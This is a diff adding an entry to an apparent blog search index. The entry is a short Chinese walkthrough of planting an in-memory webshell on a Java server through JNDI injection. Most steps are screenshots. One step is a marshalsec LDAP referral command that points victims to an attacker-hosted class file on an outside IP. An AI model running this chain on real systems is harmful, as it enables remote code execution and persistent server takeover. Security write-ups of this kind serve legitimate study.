@@ -321,4 +321,27 @@ Interceptor<span class="token punctuation">.</span><span class="token function">
         <tag>app逆向</tag>
       </tags>
   </entry>
+  <entry>
+    <title>JNDI注入打内存马</title>
+    <url>/p/23696.html</url>
+    <content><![CDATA[<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>以下两处类名需保持一致</p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image-20240329193616538.png" alt="image-20240329193616538"></p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image-20240329193903563.png" alt="image-20240329193903563"></p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%202.png" alt="image 2"></p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%203-1712456.png" alt="image 3"></p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>jmg生成class文件</p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%204.png" alt="image 4"></p>
+<p>上传vps起一个http服务</p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%205.png" alt="image 5"></p>
+<p>起ldap服务</p>
+<pre class="line-numbers language-PowerShell" data-language="PowerShell"><code class="language-PowerShell">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;8.141.3.125:9999&#x2F;#qaxnb&quot; 7777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%206.png" alt="image 6"></p>
+<p>直接注入</p>
+<p><img src="/imgs/JNDI%E6%B3%A8%E5%85%A5%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/image%207.png" alt="image 7"></p>
+]]></content>
+      <tags>
+        <tag>java安全</tag>
+      </tags>
+  </entry>
 </search>
